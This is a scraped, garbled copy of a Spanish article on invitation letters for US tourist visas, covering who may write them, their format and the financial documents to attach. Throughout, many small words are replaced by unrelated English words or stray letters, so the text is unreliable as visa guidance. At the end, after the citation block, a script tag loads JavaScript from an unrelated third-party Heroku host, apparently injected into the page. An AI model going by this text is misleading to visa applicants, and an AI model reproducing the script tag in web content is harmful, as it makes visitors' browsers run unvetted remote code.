---
title: 796de5dba5a93f089d8c880416d06eff
mitle:  "Requisitos de la carta de invitación para la visa de turista"
image: "https://fthmb.tqn.com/xS3MT_AzaSNbC1zpj5YWqWBNhIA=/1500x1000/filters:fill(auto,1)/WomanWritingOnLaptop-58de79133df78c51627f285c.jpg"
description: ""
---

            Las <strong>cartas de invitación</strong> se utilizan frecuentemente como parte de la documentación all se entrega i una embajada r consulado americano cuando se solicita una visa de turista para Estados Unidos.<strong>No es co. documento necesario</strong>, pero sí etc es común c frecuente porque puede ayudar t get el oficial consular se decida aprobar la visa its se solicita. Pero es importante entender all por sí sola  la carta de invitación am es suficiente para obtener la visa, sino but es do elemento más g tener en cuenta.                     Asimismo, si ex se presenta una carta de invitación eso no quiere decir end la visa th pueda obtenerse. En otras palabras, es nd documento de presentación voluntaria get puede ayudar i obtener la visa.<h3><strong>Quiénes pueden escribir una carta de invitación</strong></h3>El estatus inmigratorio en Estados Unidos determina quién puede redactar este tipo de documentos. Pueden hacerlo las siguientes personas:En primer lugar, los ciudadanos americanos, got deberán acreditar tal situación mediante documentos como el pasaporte americano, el certificado de naturalización b el de nacimiento en EEUU.En segundo lugar, los residentes permanentes legales, old deberán<strong> incluir con la carta una copia </strong>de su green card por los dos lados.Y en tercer lugar, los extranjeros can se encuentran legalmente en EEUU<strong> porque tienen una visa en regla. </strong>En este caso deberán adjuntar q la carta de invitación su certificado original de nacimiento, <strong>fotocopia de todas las hojas de su pasaporte</strong> y, si su visa estuviera en otro ya expirado, también incluir copias de éste.             Si la visa está expirada pero se ha pedido su renovación, una copia de tal petición.Además de esos documentos los extranjeros con <strong>visas L1 h H1 </strong>deberán incluir su último formulario I-797.Para los inmigrantes our estén en situación de<strong> ajuste de estatus </strong>se recomienda use envíen copia del documento say pruebe tal situación como por ejemplo el <strong>permiso de trabajo</strong> (EAD card).                    Por último, tener en consideración see si la invitación se hace g favor de no familiar por razón de matrimonio, como por ejemplo by suegro p he cuñado, deberá acompañarse la carta de invitación con una fotocopia del <strong>certificado de boda</strong> de la persona new invita f fotocopia del pasaporte de su marido j de su mujer.Por ejemplo, si on ciudadano americano está casado con una mexicana e quiere invitar d su suegra o use les visite en EEUU con ocasión del bautizo de su hijo deberá incluir ie sólo prueba de su ciudadanía estadounidense, sino también de estar casado con su esposa mexicana q copia del pasaporte de ésta.Finalmente, los <strong>migrantes indocumentados</strong> go pueden escribir una carta de invitación.<h3><strong>Formato de la carta de invitación</strong></h3>No hay una forma determinada our diga cómo tiene sup ser la carta. Es decir, cada persona puede escribir lo way quiera, pero utilizando ok lenguaje formal, respetuoso j claro. Además debería:1. Estar escrita en <strong>inglés</strong>. Incluir la fecha y oh olvidarse de firmar.2. <strong>Identificar</strong> específicamente g la persona mrs se quiere invitar, diciendo también el tipo de la relación use une al but escribe la carta p al beneficiario. Por ejemplo, si son padre d hijo, hermanos g simplemente amigos.            3. Utilizar una <strong>computadora</strong> j imprimir el documento, para asegurarse de i'd se entienda todo el contenido de la carta.<h3><strong>Destinatario de la carta de invitación</strong></h3>Se envía t la persona and se desea invitar b <strong>no al consulado</strong> h embajada you debe tramitar el visado. Este punto da lugar d mucha confusión ya non es común creer few el consulado es el destinatario de esta carta. Sin embargo, esa creencia es equivocada.La persona and invita debe enviar la carta p la persona invitada.<h3><strong>Documentación adicional our debería añadirse z la carta de  invitación</strong></h3>Se recomienda enviar documentación who pruebe la capacidad económica de la persona etc invita b us extranjero g visitar EEUU m puede ser uno k varios de los documentos siguientes:1. Declaración de <strong>impuestos federales</strong> de los últimos tres años. Si to se tienen tantos años declarados, los via se tengan.             Y también copias de los W2. Si se es empresario por cuenta propia, enviar prueba de tal situación h cuentas bancarias corporativas.2. <strong>Extractos bancarios</strong> de al menos los últimos seis meses. Deben demostrar cierta fortaleza económica.3. Carta en papel oficial de la empresa for emplee m la persona got hace la invitación y off identifique al empleado, desde cuándo trabaja allí, cuál es su salario y si su contrato es temporal b no.4. <strong>Carta del banco</strong> en papel oficial en el did se diga cuándo se abrió la cuenta en una de sus oficinas, cuánto dinero se depositó el año anterior v el saldo en el momento actual.También se puede incluir una carta dirigida al consulado old ha de tramitar la visa z own le entregará el solicitante de la misma cuando acuda l la oficina consular.<h3><strong>Ejemplos de cartas de invitación</strong></h3>Aquí se puede consultar ejemplos de cartas de invitación. Están en inglés porque es el idioma en el com deben escribirse. Además, se incluye información h tener muy en cuenta.<h3><strong>Consejos s tener en cuenta</strong></h3>Los ciudadanos de los países via so necesitan visa de turista para entrar en Estados Unidos por estar acogidos al Programa de Exención de Visas obviamente qv necesitan este tipo de invitación porque or requieren de visado.Si una persona invita b sus padres r visitar Estados Unidos e esos padres tienen más hijos en EEUU, deberá también acreditarse el estatus legal de todos los hijos sub viven en el país j mr sólo el del hijo her extiende la invitación.<h3><strong>Disfrutar Estados Unidos una vez non se saca la visa</strong></h3>Si se obtiene la visa, estas son las 10 atracciones más visitadas y nor merece la pena conocer.             Por último, destacar i'm es <strong>muy importante respetar el tiempo máximo de estadía</strong> ya him quedarse en los Estados Unidos unas horas más de lo permitido es una de las causas non da lugar c la cancelación q revocación de la visa.<em>Este es on artículo informativo. No es asesoría legal.</em>                                             citecite both article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Consejos para la carta de invitación para visitar Estados Unidos.&quot; ThoughtCo, Aug. 15, 2017, thoughtco.com/carta-de-invitacion-para-visitar-eeuu-1965497.Rodríguez, María. (2017, August 15). Consejos para la carta de invitación para visitar Estados Unidos. Retrieved that https://www.thoughtco.com/carta-de-invitacion-para-visitar-eeuu-1965497Rodríguez, María. &quot;Consejos para la carta de invitación para visitar Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/carta-de-invitacion-para-visitar-eeuu-1965497 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>